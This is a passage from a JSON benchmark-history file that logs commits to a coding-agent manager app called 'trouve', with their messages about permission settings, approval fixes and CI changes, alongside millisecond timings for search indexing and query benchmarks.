          "message": "Add a global default permissions setting to Modes & Models (#63)\n\n* Add a global default permissions setting to Modes & Models\n\nSettings → Modes & Models gains a \"Global default permissions\" picker\n(Ask / Allow list / Yolo) applied to new threads whose mode has no\npermission default of its own. Per-mode permissions now default to\n\"Global default\" and remain overridable in the mode editor, mirroring\nthe existing global/per-mode default-model pattern.\n\nA mode's default_permission_mode is now optional (absent = global\ndefault); the global value persists in config.toml, is settable via\nPUT /v1/config/default-permission-mode, and rides on GET /v1/providers\nalongside the default model.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Address PR review feedback for global default permissions.\n\nBump PROTOCOL_VERSION to 0.20 for the optional default_permission_mode\nschema change, guard invalid permission picker indices like the model\npicker, and clarify changelog migration behavior for existing modes.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-18T02:53:07-04:00",
          "tree_id": "0c26fdec871409df950313352bdb353df36540ec",
          "url": "https://github.com/jimsimon/trouve/commit/07bc80d5b9eb3912e4b51d3f9c702ed4541dafc0"
        },
        "date": 1784357664784,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 133.00954720000001,
            "range": "± 6.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 70.81836708,
            "range": "± 6.4",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 81.85824486000001,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 69.86727134,
            "range": "± 1.9",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "60f81e243a669e08103bc23a5750f3c602468da1",
          "message": "Fix Codex tool approvals replying with obsolete decision values (#65)\n\n* Fix Codex app-server approval replies to use accept/decline.\n\nThe Codex app-server protocol no longer recognizes approved/denied\ndecision values, so user approvals were treated as rejections.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add Codex adapter test for denied approval replies.\n\nCover the decline path so approval mapping stays paired with the existing accept case.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-18T03:50:46-04:00",
          "tree_id": "cd43fedde527f1048effc174a53273c956ec652b",
          "url": "https://github.com/jimsimon/trouve/commit/60f81e243a669e08103bc23a5750f3c602468da1"
        },
        "date": 1784361119379,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 129.7812973,
            "range": "± 5.6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 64.91864138,
            "range": "± 2.2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 76.99004598,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 63.465348000000006,
            "range": "± 1.1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "84a9c92c5b5b73e53a5632de1e152a27c7d1b542",
          "message": "Fix backend approvals that arrive before the tool card (#64)\n\n* Fix backend approvals that arrive before the tool card exists.\n\nCursor and Codex can emit permission requests before the tool_call event\nthat normally creates the UI card, leaving Approve/Deny with nowhere to\nattach and wedging the turn. Synthesize a tool.requested card when needed\nand honor turn cancellation during the approval wait.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Set requires_approval on synthetic backend tool cards.\n\nMatch bridged_approval so cards render as awaiting approval before\napproval.requested is processed, not only after the status flip.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Harden backend approval cancellation and duplicate tool cards.\n\nSkip TurnCompleted when a backend turn is cancelled so drain_queue can\nemit turn.cancelled alone. Reuse synthetic approval cards when the\nvendor's tool_started arrives later, and keep them actionable until\napproval resolves.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Address review feedback on backend approval edge cases.\n\nScope tool-card dedup to the active turn, persist partial assistant\ntext on cancelled backend turns, handle turn.cancelled in the viewmodel,\nand keep terminal tool cards stable when vendor events arrive late.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-18T15:56:14-04:00",
          "tree_id": "74de43f89adc7a08939b8518557a49deeaa55d5b",
          "url": "https://github.com/jimsimon/trouve/commit/84a9c92c5b5b73e53a5632de1e152a27c7d1b542"
        },
        "date": 1784404653563,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 141.0283915,
            "range": "± 8.6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 72.68493402000001,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 82.58797644,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 72.404626,
            "range": "± 2.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "a3add2bd8d8ff663fd49ecb24637179af2f50c2a",
          "message": "Fix scroll bookmarks bleeding between sessions on switch (#66)\n\n* Fix scroll bookmarks bleeding between sessions on switch\n\nThe shell's 1 Hz scroll poll sent a bare ChatScrolled(f32); the\ncontroller booked the sample against whatever thread was current when\nthe message was processed. Around a session/thread switch the two\ndiffer, so the outgoing thread's viewport offset (sampled up to a\nsecond earlier) was written into the incoming thread's resume\nbookmark.\n\nAttribute each sample where it's taken instead: the chat list now\ncarries a chat-thread-key property written in the same event as the\nrow swap, the poll reads key and offset in one event-loop turn, and\nChatScrolled carries the sampled thread id which the controller books\ndirectly. As a side effect the outgoing thread's final position is now\nsaved correctly even when its sample arrives after the switch.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Format ChatScrolled variant per rustfmt\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-18T16:16:56-04:00",
          "tree_id": "10003ed260ef525f1eb16b99c6de81076f59caee",
          "url": "https://github.com/jimsimon/trouve/commit/a3add2bd8d8ff663fd49ecb24637179af2f50c2a"
        },
        "date": 1784405898399,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 138.42957622000003,
            "range": "± 6.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 83.41367188000001,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 93.40664618000001,
            "range": "± 11.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 78.7370166,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "1137b36f152d421ef195b9fc30b30ed432055e4e",
          "message": "Enable network access for Codex turns (#67)\n\n* Enable network access for Codex turns\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n---------\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>",
          "timestamp": "2026-07-18T20:27:05-04:00",
          "tree_id": "c7c0d868d1bce42416bf4fe387a9e2f60ac74db7",
          "url": "https://github.com/jimsimon/trouve/commit/1137b36f152d421ef195b9fc30b30ed432055e4e"
        },
        "date": 1784420899487,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.23835008,
            "range": "± 6.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 70.36762212000001,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 81.39790528,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 67.94476397999999,
            "range": "± 1.5",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "cc782e8c7eca25a8250b892aa4b24248a9bb79f9",
          "message": "Make workspace headers reorderable (#68)\n\n* Make workspace headers reorderable\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n---------\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>",
          "timestamp": "2026-07-18T21:30:08-04:00",
          "tree_id": "84cf93b2dc27fab5494433ee77786b08a7e9199d",
          "url": "https://github.com/jimsimon/trouve/commit/cc782e8c7eca25a8250b892aa4b24248a9bb79f9"
        },
        "date": 1784424696701,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 147.7229599,
            "range": "± 6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 82.24468302000001,
            "range": "± 2.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 93.89206278,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 79.52557533999999,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "3c8897ca2d828ccfcdb0d89ac08cf6f50536e241",
          "message": "Update dependency typescript to v7 (#42)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-18T21:31:43-04:00",
          "tree_id": "12d8bd669ab16d9a934106343ce5b38378c30020",
          "url": "https://github.com/jimsimon/trouve/commit/3c8897ca2d828ccfcdb0d89ac08cf6f50536e241"
        },
        "date": 1784424812876,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 124.49118006000002,
            "range": "± 4.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.06141454,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.2235455,
            "range": "± 0.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 63.774653459999996,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "2d5ff980f06a6fdd1d876ab551762b19d5cc75d3",
          "message": "Surface Claude subscription limit errors (#69)\n\n* Surface Claude subscription limit errors\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n* Format Claude error result tests\n\n---------\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>",
          "timestamp": "2026-07-18T23:01:05-04:00",
          "tree_id": "6477d66e46b2194071b5c82e608c6fb95350ed13",
          "url": "https://github.com/jimsimon/trouve/commit/2d5ff980f06a6fdd1d876ab551762b19d5cc75d3"
        },
        "date": 1784430217215,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.26542382,
            "range": "± 2.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 69.59957,
            "range": "± 3.1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 80.19295462000001,
            "range": "± 1.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 68.32415425999999,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "5b51fc315936c809889f3a97baf37ca4bf081eb6",
          "message": "Show completed Codex reasoning messages (#71)",
          "timestamp": "2026-07-19T00:09:45-04:00",
          "tree_id": "dc06865bce5082879a064a74a46b3d3ee10d2db8",
          "url": "https://github.com/jimsimon/trouve/commit/5b51fc315936c809889f3a97baf37ca4bf081eb6"
        },
        "date": 1784434335783,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 133.28205904,
            "range": "± 20",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.237134,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 76.34722794,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.28154728,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "4b91ef782469c7a303d0a7978eb385e6f7b74efc",
          "message": "Add configurable thinking defaults (#75)\n\nPersist a global thinking level and optional per-mode overrides. Resolve inherited levels through each selected model schema so unsupported controls stay hidden and provider-specific keys remain correct.",
          "timestamp": "2026-07-19T03:59:39-04:00",
          "tree_id": "0978450ec76c9c0a7420812f2c54d8aae38c1b5a",
          "url": "https://github.com/jimsimon/trouve/commit/4b91ef782469c7a303d0a7978eb385e6f7b74efc"
        },
        "date": 1784448133515,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 127.94186326,
            "range": "± 768.6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 69.00071248,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 81.28731204,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 66.5837597,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "81e68be4ee24d96c853c0e13cc662ef52a2c3da4",
          "message": "Release Codex waiters when app-server exits (#73)",
          "timestamp": "2026-07-19T04:04:24-04:00",
          "tree_id": "230cbef346ca6e78c913ca4c16368e07f11ac325",
          "url": "https://github.com/jimsimon/trouve/commit/81e68be4ee24d96c853c0e13cc662ef52a2c3da4"
        },
        "date": 1784448352657,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 128.02419916000002,
            "range": "± 8.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.32035714000001,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.98408022000001,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 65.25860808,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "85ddf1d0968fe08dd096bc0fdf84adf3fa07ec63",
          "message": "Allow Codex Git writes in mutable modes (#76)\n\nCodex workspace-write makes linked worktree metadata read-only, so even index locks fail. Run mutable Codex turns without its OS sandbox while preserving Ask approvals and the read-only sandbox.",
          "timestamp": "2026-07-19T04:05:44-04:00",
          "tree_id": "b9b9361e691bb53d84f79eb8f41558e4b650ef72",
          "url": "https://github.com/jimsimon/trouve/commit/85ddf1d0968fe08dd096bc0fdf84adf3fa07ec63"
        },
        "date": 1784448485754,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 139.21793606,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 77.80127118,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 88.46287844,
            "range": "± 0.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 80.3482639,
            "range": "± 24.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "7c4abc8bfa0c0ca9371e93736b9a426bf5c280e9",
          "message": "Reduce dev build debuginfo to shrink target dirs (#94)\n\nDev builds used cargo defaults: full DWARF for every crate, which made\neach session worktree's target/ run 20-30 GB. Line tables keep\nbacktraces and panic locations useful for workspace crates; dependency\ndebuginfo is dropped entirely.\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-19T04:17:54-04:00",
          "tree_id": "aa9fd595dd31457a03af1acecb90139ccd68dbe5",
          "url": "https://github.com/jimsimon/trouve/commit/7c4abc8bfa0c0ca9371e93736b9a426bf5c280e9"
        },
        "date": 1784449222265,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 125.24615654000002,
            "range": "± 281.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 68.52833302,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 82.24865212,
            "range": "± 2.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 67.46985633999999,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ba9e9b1aecd0c60e8f597257ad71deb690cb52a7",
          "message": "Improve session list status indicators (#78)\n\n* Improve session list status indicators\n\n* Address session indicator review feedback\n\nStop obsolete event followers, cache attention totals, and bound sidebar PR requests. Preserve unread completion state across event-stream reconnects without treating startup history as new work.\n\n* Retry failed sidebar PR lookups\n\nKeep transient lookup failures out of the navigation PR cache so later session reloads can retry them.",
          "timestamp": "2026-07-19T04:35:01-04:00",
          "tree_id": "f7de48f1c758da2425fb2a5de775b14921132f88",
          "url": "https://github.com/jimsimon/trouve/commit/ba9e9b1aecd0c60e8f597257ad71deb690cb52a7"
        },
        "date": 1784450193068,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 112.6376152,
            "range": "± 12.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 55.30018286000001,
            "range": "± 2.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 74.08038866000001,
            "range": "± 88.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 55.62856920000001,
            "range": "± 3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ef1f2a00ac3aaac7e551969ff621af41fe0e9529",
          "message": "Keep sidebar controls clear of scrollbar (#91)",
          "timestamp": "2026-07-19T15:32:41-04:00",
          "tree_id": "da3a12c9ea478e6bc465193ef051baa4e9a1bd80",
          "url": "https://github.com/jimsimon/trouve/commit/ef1f2a00ac3aaac7e551969ff621af41fe0e9529"
        },
        "date": 1784489645716,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 138.89516016,
            "range": "± 5.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 78.1045238,
            "range": "± 3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 88.18060354,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 79.33142356,
            "range": "± 2.1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "453794e96213b232a21f6fd8ef6bf089ba970674",
          "message": "Classify Codex tool activity summaries (#74)\n\n* Classify Codex tool activity summaries\n\n* Expand Codex activity classification coverage",
          "timestamp": "2026-07-19T15:35:20-04:00",
          "tree_id": "b22ad1dd43a98c8da972aaf9710567e530a566be",
          "url": "https://github.com/jimsimon/trouve/commit/453794e96213b232a21f6fd8ef6bf089ba970674"
        },
        "date": 1784489795150,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 106.08644064,
            "range": "± 9.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 56.468868840000006,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 74.91667418,
            "range": "± 7.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 58.763904000000004,
            "range": "± 34.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "2ff8ab89aa3a36abb2dd2a89354def09baabe373",
          "message": "Update Rust crate toml to v1 (#60)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-19T15:37:07-04:00",
          "tree_id": "bf6420078181c60f0fb89820cd90c30d8fb50171",
          "url": "https://github.com/jimsimon/trouve/commit/2ff8ab89aa3a36abb2dd2a89354def09baabe373"
        },
        "date": 1784489936899,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 142.89682136000002,
            "range": "± 12.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 78.06576682000001,
            "range": "± 2.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 88.45577908,
            "range": "± 2.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 75.47462132000001,
            "range": "± 2.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "0e6584c2b5459fca290c9b00ca5ee7391bc9fdd3",
          "message": "Update dependency @types/node to v24 (#36)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-19T15:38:37-04:00",
          "tree_id": "b38fa27a56472dfa5699f0d2a1f7158024a1a1fb",
          "url": "https://github.com/jimsimon/trouve/commit/0e6584c2b5459fca290c9b00ca5ee7391bc9fdd3"
        },
        "date": 1784490077440,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 137.85435788,
            "range": "± 14.9",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 61.695322180000005,
            "range": "± 2.2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 80.90836964,
            "range": "± 18.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 61.56436968,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "05b7f1af23673fd17ce3ebe50ab723062f8ba62e",
          "message": "Describe active tool calls during turns (#90)",
          "timestamp": "2026-07-19T15:40:42-04:00",
          "tree_id": "86a7b89182e7e315628234edc3743c62000cfd42",
          "url": "https://github.com/jimsimon/trouve/commit/05b7f1af23673fd17ce3ebe50ab723062f8ba62e"
        },
        "date": 1784490196332,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 134.71862690000003,
            "range": "± 4.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 66.65005808000002,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 78.27934784000001,
            "range": "± 1.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.35381108,
            "range": "± 1.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ddc34003264b60311d61c986d950a6f71184597c",
          "message": "Confine vendor agents to session worktrees (#79)\n\n* Confine vendor agents to session worktrees\n\nRun Cursor ACP processes per worktree so process cwd fallbacks cannot mutate the main checkout. Deny structured vendor writes that escape the worktree and bound idle Cursor and Claude process retention.\n\n* Canonicalize Cursor cwd assertions on macOS",
          "timestamp": "2026-07-19T16:32:05-04:00",
          "tree_id": "a3cf55903bde8c98feb5295df949e654258fae85",
          "url": "https://github.com/jimsimon/trouve/commit/ddc34003264b60311d61c986d950a6f71184597c"
        },
        "date": 1784493207214,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 128.5924565,
            "range": "± 7.3",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 66.1135601,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.60439394,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 63.76475882000002,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "380175279b2960afb5f39481cd7dce4b881ecaf0",
          "message": "Speed up CI test runs (#95)\n\n* Speed up CI test runs\n\nThe test workflow took ~20 minutes per PR. Per-job timings showed most\nof it was avoidable:\n\n- Gate the full-workspace release build (10-13 min, thin LTO +\n  codegen-units=1) to pushes to main. PRs keep release-compile coverage\n  of trouve-search via the bench and parity jobs; release.yml covers\n  the rest on tags.\n- Scope test-with-model to trouve-search, the only crate with\n  #[ignore]d tests, instead of compiling all 12 crates (including the\n  Slint GUI code — which is also why the job needed fontconfig/dbus;\n  that apt step is gone too).\n- Add a concurrency group so superseded PR runs are cancelled instead\n  of racing the winners to save the same rust-cache key (runs showed\n  \"Failed to save: Unable to reserve cache\" on every job).\n- Add a lint check that fails if an #[ignore]d test lands outside\n  trouve-search, so the scoped model job can't silently skip one.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Address review: attribute-aware tripwire, least-privilege permissions\n\n- Extend the ignored-test check to also match #[cfg_attr(..., ignore)]\n  forms, with a word boundary so identifiers like `ignored` don't match.\n  Comment/string false positives remain possible but fail loudly, which\n  is the cheap direction to be wrong in.\n- Add `permissions: contents: read` to the test and lint workflows;\n  every job only checks out, builds, tests, and caches.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-19T16:40:10-04:00",
          "tree_id": "84b0d900ee5e7d90455813ad13be2db5b677a36a",
          "url": "https://github.com/jimsimon/trouve/commit/380175279b2960afb5f39481cd7dce4b881ecaf0"
        },
        "date": 1784493690841,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 135.36181038,
            "range": "± 4.9",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 71.86895195999999,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 83.12219268,
